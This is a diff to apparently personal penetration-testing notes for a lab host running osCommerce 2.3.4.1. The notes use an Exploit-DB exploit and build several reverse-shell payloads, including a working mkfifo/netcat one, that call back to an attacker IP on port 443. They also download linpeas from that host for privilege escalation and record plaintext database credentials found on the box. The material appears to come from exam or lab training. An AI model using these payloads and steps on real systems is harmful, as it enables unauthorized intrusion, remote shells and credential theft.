@@ -73,7 +73,7 @@ smbclient -L 192.168.213.222
 smbmap -H 192.168.213.222
 ```
 
-.223
+.223 (milan)
 ```
 nmap 192.168.213.223
 sudo nmap -sU --open -p 161 192.168.213.223
@@ -90,6 +90,10 @@ feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-wor
 # find http://192.168.213.223:60001/docs/release_notes.pdf - # osCommerce 2.3.4.1
 # find https://www.exploit-db.com/exploits/44374
 
+# run to get shell on 443
+python3 44374.py
+
+# source for shells: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 # Does not work
 my_shell_file = open("/home/kali/relia/shell.php")
 shell_data = my_shell_file.read()
@@ -100,8 +104,26 @@ payload += 'system("nc -e /bin/bash 192.168.45.160 443");'
 # doesn't work, probably not using file descriptor 3
 payload += '$sock=fsockopen("192.168.45.160",443);exec("/bin/sh -i <&3 >&3 2>&3");'
 
-# This one works.
+# This one works. (alternative if nc -e does not work)
 payload += 'system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.160 443 >/tmp/f");'
 
 nc -nvlp 443
+```
+
+.223 privesc
+```
+wget http://192.168.45.160/linpeas.sh -O linpeas.sh
+
+# findings
+# root is running an apache2 process
+# writable /var/www/html/froxlor, also a github repo
+# so there's an apache server running on 60002 (and 80?) that's running this froxlor thing, owned by root - we know what is running where because linpeas outputs apache configs
+# users milan and sarah, milan is in the adm and sudo groups
+# port 60002, 631, 3306, 22 are active on the box (see active ports section from linpeas)
+# this command would show you what is on 60002 but we aren't root
+netstat -ltnp | grep -w ':60002'
+netstat -ltnp | grep -w ':80'
+# find db creds
+db=oscdb, user=oscuser, password=7NVLVTDGJ38HM2TQ
+# local.txt is in /root
 ```
